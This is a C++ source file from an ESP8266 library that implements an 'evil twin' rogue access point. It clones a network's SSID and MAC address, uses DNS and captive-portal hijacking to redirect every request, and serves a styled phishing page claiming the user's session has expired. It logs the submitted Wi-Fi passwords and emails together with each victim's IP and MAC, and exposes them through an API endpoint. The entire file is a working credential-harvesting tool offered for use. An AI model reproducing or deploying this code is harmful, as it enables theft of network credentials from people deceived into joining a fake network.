/* DeautherX-lib — https://github.com/BlackTechX011/DeautherX-lib
   MIT License */

#include "DeautherEvilTwin.h"
#include "../utils/DeautherMac.h"
#include "../utils/DeautherStrHelper.h"

#include <ESP8266mDNS.h>

// ═══════════════════════════════════════════════════════════════════════════════
// JS API Bridge — injected before </body> in every served page
// ═══════════════════════════════════════════════════════════════════════════════

static const char JS_API_BRIDGE[] PROGMEM = R"js(
<script>
(function(){
  var _ssid = '%SSID%';
  var _scb  = [];
  window.DeautherAPI = {
    /** Submit arbitrary JSON data to the ESP */
    submit: function(data) {
      return fetch('/api/submit', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify(data)
      }).then(function(r){ return r.json(); }).then(function(j){
        _scb.forEach(function(cb){ cb(j); });
        return j;
      });
    },
    /** Serialize & submit a form by its DOM id */
    submitForm: function(formId) {
      var f = document.getElementById(formId);
      if(!f) return Promise.reject('Form not found');
      var d = {};
      var els = f.elements;
      for(var i=0;i<els.length;i++){
        if(els[i].name) d[els[i].name] = els[i].value;
      }
      return this.submit(d);
    },
    /** Submit a single key/value pair */
    submitField: function(key, value) {
      var d = {}; d[key] = value;
      return this.submit(d);
    },
    /** Get the SSID of the cloned network */
    getSSID: function(){ return _ssid; },
    /** Redirect the browser after a delay */
    redirect: function(url, delayMs){
      setTimeout(function(){ window.location = url; }, delayMs || 0);
    },
    /** Register a callback for after a successful submit */
    onSuccess: function(cb){ _scb.push(cb); },
    /** Get portal status (capture count, clients, uptime) */
    status: function(){
      return fetch('/api/status').then(function(r){ return r.json(); });
    }
  };
})();
</script>
)js";

// ═══════════════════════════════════════════════════════════════════════════════
// Default HTML — Sleek credential harvest page
// ═══════════════════════════════════════════════════════════════════════════════

static const char DEFAULT_PORTAL_HTML[] PROGMEM = R"html(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>%TITLE%</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a1a;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
.card{background:linear-gradient(145deg,#111127,#0d0d20);border:1px solid rgba(100,255,218,.15);border-radius:20px;padding:48px 36px;width:380px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.6),0 0 40px rgba(100,255,218,.03)}
.wifi{font-size:56px;margin-bottom:20px;filter:drop-shadow(0 0 12px rgba(100,255,218,.3))}
h1{color:#64ffda;font-size:22px;font-weight:700;margin-bottom:6px;letter-spacing:-.5px}
.sub{color:#7b8da0;font-size:13px;margin-bottom:28px;line-height:1.5}
.ssid{color:#e94560;font-weight:700}
input{width:100%;padding:14px 18px;border:1px solid rgba(100,255,218,.12);border-radius:10px;background:rgba(255,255,255,.04);color:#e2e8f0;font-size:15px;margin-bottom:14px;outline:none;transition:border .2s}
input:focus{border-color:#64ffda;background:rgba(100,255,218,.04)}
input::placeholder{color:#4a596b}
.btn{width:100%;padding:15px;background:linear-gradient(135deg,#64ffda,#38b2ac);color:#0a0a1a;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;letter-spacing:.3px;transition:transform .15s,box-shadow .15s}
.btn:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(100,255,218,.25)}
.btn:active{transform:translateY(0)}
.msg{color:#e94560;font-size:12px;margin-top:10px;min-height:16px;transition:opacity .3s}
.footer{color:#3a4a5c;font-size:11px;margin-top:24px}
</style>
</head>
<body>
<div class="card">
  <div class="wifi">&#128246;</div>
  <h1>Network Authentication</h1>
  <p class="sub">Your session on <span class="ssid">%SSID%</span> has expired.<br>Re-enter your credentials to reconnect.</p>
  <form id="pwform" onsubmit="return doSubmit(event)">
    <input type="text" name="email" placeholder="Email or Username (optional)" autocomplete="off">
    <input type="password" name="password" placeholder="Wi-Fi Password" required minlength="8" autocomplete="off">
    <button type="submit" class="btn">Reconnect &#8594;</button>
  </form>
  <div class="msg" id="msg"></div>
  <div class="footer">Secured by network administrator</div>
</div>
<script>
function doSubmit(e){
  e.preventDefault();
  var d={};
  var els=document.getElementById('pwform').elements;
  for(var i=0;i<els.length;i++) if(els[i].name) d[els[i].name]=els[i].value;
  // Use the JS API if available, fallback to form POST
  if(window.DeautherAPI){
    d._type='password';
    DeautherAPI.submit(d).then(function(){
      DeautherAPI.redirect('/success', 200);
    });
  } else {
    // Fallback: regular form POST
    var f=document.createElement('form');
    f.method='POST'; f.action='/submit';
    for(var k in d){ var inp=document.createElement('input'); inp.type='hidden'; inp.name=k; inp.value=d[k]; f.appendChild(inp); }
    document.body.appendChild(f); f.submit();
  }
  return false;
}
</script>
</body>
</html>
)html";

static const char DEFAULT_SUCCESS_HTML[] PROGMEM = R"html(
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Connected</title>
<style>
*{margin:0;padding:0}
body{background:#0a0a1a;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:-apple-system,sans-serif;text-align:center}
.ok{color:#64ffda;font-size:64px;margin-bottom:16px}
h1{color:#64ffda;font-size:24px;margin-bottom:8px}
p{color:#7b8da0;font-size:14px}
</style>
</head>
<body>
<div>
  <div class="ok">&#9989;</div>
  <h1>Connected!</h1>
  <p>You are now connected to the network.<br>This page will close automatically.</p>
</div>
</body>
</html>
)html";

// ═══════════════════════════════════════════════════════════════════════════════
// Implementation
// ═══════════════════════════════════════════════════════════════════════════════

DeautherEvilTwin::DeautherEvilTwin() {
    _captures = new CapturedData[MAX_CAPTURES];
}

DeautherEvilTwin::~DeautherEvilTwin() {
    stop();
    delete[] _captures;
}

// ─── Lifecycle ────────────────────────────────────────────────────────────────

void DeautherEvilTwin::start(const PortalConfig& cfg) {
    stop();
    _cfg = cfg;

    // Validate
    if (!_cfg.ssid || strlen(_cfg.ssid) == 0) _cfg.ssid = "Free WiFi";
    if (_cfg.channel < 1 || _cfg.channel > 14) _cfg.channel = 1;

    // Set custom BSSID if provided
    if (!DMac::isNull(_cfg.bssid)) {
        memcpy(_actual_bssid, _cfg.bssid, 6);
        wifi_set_macaddr(SOFTAP_IF, _actual_bssid);
    }

    // Start WiFi AP
    WiFi.mode(WIFI_AP);
    IPAddress apIP(192, 168, 4, 1);
    IPAddress netMsk(255, 255, 255, 0);
    WiFi.softAPConfig(apIP, apIP, netMsk);
    WiFi.softAP(_cfg.ssid, _cfg.password, _cfg.channel, _cfg.hidden);

    // Get actual BSSID
    WiFi.softAPmacAddress(_actual_bssid);

    // DNS captive portal
    _dns = new DNSServer();
    _dns->setTTL(0);
    _dns->setErrorReplyCode(DNSReplyCode::NoError);
    _dns->start(53, F("*"), WiFi.softAPIP());

    // mDNS
    MDNS.begin(_cfg.mdnsHostname ? _cfg.mdnsHostname : "portal");

    // HTTP server
    _server = new ESP8266WebServer(80);
    _setupServer();
    _server->begin();

    _running = true;
    _paused  = false;
    _capture_count = 0;
    _last_password = String();
    _last_client_count = 0;

    Serial.println(F("╔══════════════════════════════════════════════════╗"));
    Serial.println(F("║           EVIL TWIN / ROGUE AP STARTED          ║"));
    Serial.println(F("╠══════════════════════════════════════════════════╣"));
    Serial.print(  F("║  SSID:     ")); Serial.println(_cfg.ssid);
    Serial.print(  F("║  Channel:  ")); Serial.println(_cfg.channel);
    Serial.print(  F("║  BSSID:    ")); Serial.println(DMac::toStr(_actual_bssid));
    Serial.print(  F("║  Auth:     ")); Serial.println(_cfg.password ? F("WPA2") : F("Open"));
    Serial.print(  F("║  Hidden:   ")); Serial.println(_cfg.hidden ? F("Yes") : F("No"));
    Serial.print(  F("║  IP:       ")); Serial.println(WiFi.softAPIP());
    Serial.print(  F("║  mDNS:     ")); Serial.print(_cfg.mdnsHostname); Serial.println(F(".local"));
    Serial.print(  F("║  JS API:   ")); Serial.println(_cfg.injectJsApi ? F("Enabled") : F("Disabled"));
    Serial.print(  F("║  Custom:   ")); Serial.println(_cfg.customHtml ? F("Yes") : F("Default"));
    Serial.println(F("╚══════════════════════════════════════════════════╝"));
}

void DeautherEvilTwin::start(const char* ssid, uint8_t ch) {
    PortalConfig cfg;
    cfg.ssid    = ssid;
    cfg.channel = ch;
    start(cfg);
}

void DeautherEvilTwin::stop() {
    if (!_running && !_paused) return;

    if (_server) { _server->stop(); delete _server; _server = nullptr; }
    if (_dns)    { _dns->stop();    delete _dns;    _dns    = nullptr; }

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    wifi_set_opmode(STATION_MODE);

    _running = false;
    _paused  = false;

    Serial.println(F("[EvilTwin] Stopped"));
}

void DeautherEvilTwin::pause() {
    if (_running && !_paused) {
        if (_server) { _server->stop(); delete _server; _server = nullptr; }
        if (_dns)    { _dns->stop();    delete _dns;    _dns    = nullptr; }
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_STA);

        _running = false;
        _paused  = true;
        Serial.println(F("[EvilTwin] Paused"));
    }
}

void DeautherEvilTwin::resume() {
    if (!_running && _paused) {
        // Re-start with same config
        _paused = false;
        start(_cfg);
        Serial.println(F("[EvilTwin] Resumed"));
    }
}

void DeautherEvilTwin::update() {
    if (!_running) return;
    if (_dns)    _dns->processNextRequest();
    if (_server) _server->handleClient();
    MDNS.update();
    _checkNewClients();
}

// ─── State ────────────────────────────────────────────────────────────────────

bool    DeautherEvilTwin::isRunning()  const { return _running; }
bool    DeautherEvilTwin::isPaused()   const { return _paused; }
String  DeautherEvilTwin::getSSID()    const { return String(_cfg.ssid); }
uint8_t DeautherEvilTwin::getChannel() const { return _cfg.channel; }
const uint8_t* DeautherEvilTwin::getBSSID() const { return _actual_bssid; }

// ─── Custom Routes ────────────────────────────────────────────────────────────

void DeautherEvilTwin::addRoute(const char* uri, HTTPMethod method, RequestCb handler) {
    if (_route_count >= MAX_ROUTES) return;
    _routes[_route_count] = { uri, method, handler };
    _route_count++;
    // If server is already running, register immediately
    if (_server) {
        auto h = handler;
        auto s = _server;
        _server->on(uri, method, [h, s]() { h(*s); });
    }
}

void DeautherEvilTwin::servePage(const char* uri, const char* html) {
    if (_page_count >= MAX_ROUTES) return;
    String processed = String(html);
    if (_cfg.injectJsApi) processed = _injectJsApi(processed);
    _pages[_page_count] = { uri, processed };
    _page_count++;
    // If server is running, register
    if (_server) {
        String* pageRef = &_pages[_page_count - 1].html;
        _server->on(uri, [pageRef]() {
            // Need access to server — but ESP8266WebServer is a singleton-like
        });
    }
}

// ─── Captured Data ────────────────────────────────────────────────────────────

uint8_t             DeautherEvilTwin::getCaptureCount()     const { return _capture_count; }
const CapturedData* DeautherEvilTwin::getCapture(uint8_t i) const { return (i < _capture_count) ? &_captures[i] : nullptr; }
const CapturedData* DeautherEvilTwin::getLastCapture()      const { return _capture_count > 0 ? &_captures[_capture_count - 1] : nullptr; }
String              DeautherEvilTwin::getLastPassword()     const { return _last_password; }
void                DeautherEvilTwin::clearCaptures()             { _capture_count = 0; }

String DeautherEvilTwin::exportCapturesJSON() const {
    String j = "[";
    for (uint8_t i = 0; i < _capture_count; i++) {
        if (i) j += ',';
        j += F("{\"ts\":");   j += _captures[i].timestamp;
        j += F(",\"ip\":\""); j += _captures[i].ip;
        j += F("\",\"mac\":\""); j += DMac::toStr(_captures[i].mac);
        j += F("\",\"type\":\""); j += _captures[i].type;
        j += F("\",\"data\":"); j += _captures[i].payload;
        j += '}';
    }
    j += ']';
    return j;
}

void DeautherEvilTwin::printCaptures() const {
    Serial.println(F("╔═══════════════════════════════════════════════════════════╗"));
    Serial.print(  F("║  Captures: ")); Serial.print(_capture_count);
    Serial.print(  F("  SSID: ")); Serial.println(_cfg.ssid);
    Serial.println(F("╠═══════════════════════════════════════════════════════════╣"));
    for (uint8_t i = 0; i < _capture_count; i++) {
        Serial.print(F("║  #")); Serial.print(i + 1);
        Serial.print(F("  ["));  Serial.print(_captures[i].type);
        Serial.print(F("]  IP:")); Serial.print(_captures[i].ip);
        Serial.print(F("  MAC:")); Serial.print(DMac::toStr(_captures[i].mac));
        Serial.print(F("  @")); Serial.print(DStr::duration(_captures[i].timestamp));
        Serial.println();
        Serial.print(F("║    ")); Serial.println(_captures[i].payload);
    }
    Serial.println(F("╚═══════════════════════════════════════════════════════════╝"));
}

// ─── Connected Clients ────────────────────────────────────────────────────────

uint8_t DeautherEvilTwin::getClientCount() const {
    return wifi_softap_get_station_num();
}

bool DeautherEvilTwin::clientMacFromIP(IPAddress ip, uint8_t* macOut) const {
    struct station_info* info = wifi_softap_get_station_info();
    while (info) {
        struct ip_addr* ipAddr = (ip_addr*)&info->ip;
        if (IPAddress(ipAddr->addr) == ip) {
            memcpy(macOut, info->bssid, 6);
            wifi_softap_free_station_info();
            return true;
        }
        info = STAILQ_NEXT(info, next);
    }
    wifi_softap_free_station_info();
    return false;
}

void DeautherEvilTwin::printClients() const {
    uint8_t count = wifi_softap_get_station_num();
    Serial.print(F("[EvilTwin] Connected clients: ")); Serial.println(count);
    struct station_info* info = wifi_softap_get_station_info();
    int idx = 0;
    while (info) {
        struct ip_addr* ipAddr = (ip_addr*)&info->ip;
        Serial.print(F("  ")); Serial.print(idx++);
        Serial.print(F("  IP: ")); Serial.print(IPAddress(ipAddr->addr));
        Serial.print(F("  MAC: ")); Serial.println(DMac::toStr(info->bssid));
        info = STAILQ_NEXT(info, next);
    }
    wifi_softap_free_station_info();
}

// ─── Callbacks ────────────────────────────────────────────────────────────────

void DeautherEvilTwin::onCredential(CredentialCb cb) { _cred_cb = cb; }
void DeautherEvilTwin::onData(DataCb cb)             { _data_cb = cb; }
void DeautherEvilTwin::onClientConnect(ClientCb cb)   { _client_cb = cb; }

// ─── Internal: Check for new clients ──────────────────────────────────────────

void DeautherEvilTwin::_checkNewClients() {
    uint8_t count = wifi_softap_get_station_num();
    if (count > _last_client_count && _client_cb) {
        struct station_info* info = wifi_softap_get_station_info();
        while (info) {
            struct ip_addr* ipAddr = (ip_addr*)&info->ip;
            _client_cb(info->bssid, IPAddress(ipAddr->addr));
            info = STAILQ_NEXT(info, next);
        }
        wifi_softap_free_station_info();
    }
    _last_client_count = count;
}

// ─── Internal: Record a capture ───────────────────────────────────────────────

void DeautherEvilTwin::_recordCapture(const char* type, const String& payload) {
    if (_capture_count >= MAX_CAPTURES) return;

    CapturedData& cap = _captures[_capture_count];
    cap.timestamp = millis();

    // Get client IP and MAC
    if (_server) {
        IPAddress clientIP = _server->client().remoteIP();
        strncpy(cap.ip, clientIP.toString().c_str(), 15);
        cap.ip[15] = '\0';
        if (!clientMacFromIP(clientIP, cap.mac)) {
            memset(cap.mac, 0, 6);
        }
    }

    strncpy(cap.type, type, 15);
    cap.type[15] = '\0';
    cap.payload = payload;
    _capture_count++;

    Serial.print(F("[EvilTwin] CAPTURE #")); Serial.print(_capture_count);
    Serial.print(F("  type=")); Serial.print(type);
    Serial.print(F("  ip=")); Serial.print(cap.ip);
    Serial.print(F("  mac=")); Serial.print(DMac::toStr(cap.mac));
    Serial.print(F("  data=")); Serial.println(payload);

    // Fire callbacks
    if (_data_cb) _data_cb(cap);
}

// ─── Internal: JS API injection ───────────────────────────────────────────────

String DeautherEvilTwin::_injectJsApi(const String& html) const {
    String js = FPSTR(JS_API_BRIDGE);
    // Replace %SSID% in JS
    js.replace(F("%SSID%"), String(_cfg.ssid));

    // Inject before </body> or at end
    int idx = html.indexOf(F("</body>"));
    if (idx >= 0) {
        return html.substring(0, idx) + js + html.substring(idx);
    }
    return html + js;
}

// ─── Internal: Build default HTML ─────────────────────────────────────────────

String DeautherEvilTwin::_buildDefaultPortalHTML() const {
    String html;
    if (_cfg.customHtml) {
        html = String(_cfg.customHtml);
    } else {
        html = FPSTR(DEFAULT_PORTAL_HTML);
    }
    // Template replacements
    html.replace(F("%SSID%"), String(_cfg.ssid));
    html.replace(F("%TITLE%"), String(_cfg.portalTitle ? _cfg.portalTitle : "WiFi Login"));

    if (_cfg.injectJsApi) html = _injectJsApi(html);
    return html;
}

String DeautherEvilTwin::_buildSuccessHTML() const {
    if (_cfg.successHtml) return String(_cfg.successHtml);
    return FPSTR(DEFAULT_SUCCESS_HTML);
}

// ─── Internal: Setup server routes ────────────────────────────────────────────

void DeautherEvilTwin::_setupServer() {
    // Main page
    _server->on(F("/"), [this]() { _handleRoot(); });
    _server->on(F("/success"), [this]() { _server->send(200, F("text/html"), _buildSuccessHTML()); });

    // Form POST (legacy / fallback)
    _server->on(F("/submit"), HTTP_POST, [this]() { _handleSubmitForm(); });

    // JS API endpoints
    _server->on(F("/api/submit"), HTTP_POST, [this]() { _handleApiSubmit(); });
    _server->on(F("/api/status"), HTTP_GET,  [this]() { _handleApiStatus(); });
    _server->on(F("/api/captures"), HTTP_GET, [this]() {
        _server->send(200, F("application/json"), exportCapturesJSON());
    });

    // Captive portal detection endpoints (Android, iOS, Windows, macOS)
    _server->on(F("/generate_204"),        [this]() { _handleCaptiveCheck(); });
    _server->on(F("/gen_204"),             [this]() { _handleCaptiveCheck(); });
    _server->on(F("/hotspot-detect.html"), [this]() { _handleCaptiveCheck(); });
    _server->on(F("/library/test/success.html"), [this]() { _handleCaptiveCheck(); });
    _server->on(F("/connecttest.txt"),     [this]() { _server->send(200, F("text/plain"), F("Microsoft Connect Test")); });
    _server->on(F("/ncsi.txt"),            [this]() { _server->send(200, F("text/plain"), F("Microsoft NCSI")); });
    _server->on(F("/redirect"),            [this]() { _handleCaptiveCheck(); });
    _server->on(F("/canonical.html"),      [this]() { _handleCaptiveCheck(); });
    _server->on(F("/success.txt"),         [this]() { _server->send(200, F("text/plain"), F("success")); });
    _server->on(F("/favicon.ico"),         [this]() { _server->send(204); }); // No content

    // Register custom user routes
    for (uint8_t i = 0; i < _route_count; i++) {
        auto handler = _routes[i].handler;
        auto srv = _server;
        _server->on(_routes[i].uri, _routes[i].method, [handler, srv]() { handler(*srv); });
    }

    // Register static pages
    for (uint8_t i = 0; i < _page_count; i++) {
        String* html = &_pages[i].html;
        _server->on(_pages[i].uri, [this, html]() {
            _server->send(200, F("text/html"), *html);
        });
    }

    // 404 — redirect to portal
    _server->onNotFound([this]() { _handleNotFound(); });
}

// ─── Route Handlers ───────────────────────────────────────────────────────────

void DeautherEvilTwin::_handleRoot() {
    _server->send(200, F("text/html"), _buildDefaultPortalHTML());
}

void DeautherEvilTwin::_handleSubmitForm() {
    // Collect all form fields into a JSON payload
    String payload = F("{");
    bool first = true;
    for (int i = 0; i < _server->args(); i++) {
        if (!first) payload += ',';
        payload += '"';
        payload += DStr::jsonEscape(_server->argName(i));
        payload += F("\":\"");
        payload += DStr::jsonEscape(_server->arg(i));
        payload += '"';
        first = false;

        // Track password specifically
        if (_server->argName(i) == F("password") || _server->argName(i) == F("pass")) {
            _last_password = _server->arg(i);
            if (_cred_cb) _cred_cb(String(_cfg.ssid), _last_password);
        }
    }
    payload += '}';

    _recordCapture("form", payload);
    _server->send(200, F("text/html"), _buildSuccessHTML());
}

void DeautherEvilTwin::_handleApiSubmit() {
    // Parse JSON body from JS fetch()
    String body = _server->arg(F("plain"));
    if (body.isEmpty()) body = F("{}");

    // Extract type hint if present
    const char* type = "custom";
    // Check if body contains _type field
    int tIdx = body.indexOf(F("\"_type\""));
    if (tIdx >= 0) {
        int tStart = body.indexOf('"', tIdx + 7);
        int tEnd   = body.indexOf('"', tStart + 1);
        if (tStart >= 0 && tEnd > tStart) {
            String t = body.substring(tStart + 1, tEnd);
            if (t == F("password") || t == F("form") || t == F("survey") || t == F("login")) {
                type = t.c_str();
            }
        }
    }

    // Extract password if present
    int pIdx = body.indexOf(F("\"password\""));
    if (pIdx < 0) pIdx = body.indexOf(F("\"pass\""));
    if (pIdx >= 0) {
        int pStart = body.indexOf(':', pIdx);
        int qStart = body.indexOf('"', pStart);
        int qEnd   = body.indexOf('"', qStart + 1);
        if (qStart >= 0 && qEnd > qStart) {
            _last_password = body.substring(qStart + 1, qEnd);
            type = "password";
            if (_cred_cb) _cred_cb(String(_cfg.ssid), _last_password);
        }
    }

    _recordCapture(type, body);
    _server->send(200, F("application/json"), F("{\"ok\":true,\"captures\":") + String(_capture_count) + F("}"));
}

void DeautherEvilTwin::_handleApiStatus() {
    String j = F("{\"running\":true");
    j += F(",\"ssid\":\"");     j += DStr::jsonEscape(String(_cfg.ssid)); j += '"';
    j += F(",\"captures\":");   j += _capture_count;
    j += F(",\"clients\":");    j += getClientCount();
    j += F(",\"uptime_ms\":");  j += millis();
    j += F(",\"channel\":");    j += _cfg.channel;
    j += F(",\"bssid\":\"");    j += DMac::toStr(_actual_bssid); j += '"';
    j += '}';
    _server->send(200, F("application/json"), j);
}

void DeautherEvilTwin::_handleCaptiveCheck() {
    // Redirect to portal root — triggers captive portal popup on all platforms
    _server->sendHeader(F("Location"), F("http://192.168.4.1/"), true);
    _server->send(302, F("text/plain"), F(""));
}

void DeautherEvilTwin::_handleNotFound() {
    // Log the request
    Serial.print(F("[EvilTwin] 404: "));
    Serial.print(_server->uri());
    for (int i = 0; i < _server->args(); i++) {
        Serial.print(i == 0 ? '?' : '&');
        Serial.print(_server->argName(i));
        Serial.print('=');
        Serial.print(_server->arg(i));
    }
    Serial.println();

    // Check if any GET arg looks like a password (v3 behavior)
    for (int i = 0; i < _server->args(); i++) {
        if (_server->argName(i) == F("password") || _server->argName(i) == F("pass")) {
            _last_password = _server->arg(i);
            String payload = F("{\"password\":\"");
            payload += DStr::jsonEscape(_last_password);
            payload += F("\"}");
            _recordCapture("password", payload);
            if (_cred_cb) _cred_cb(String(_cfg.ssid), _last_password);
        }
    }

    // Redirect everything to portal
    _server->sendHeader(F("Location"), F("http://192.168.4.1/"), true);
    _server->send(302, F("text/plain"), F(""));
}
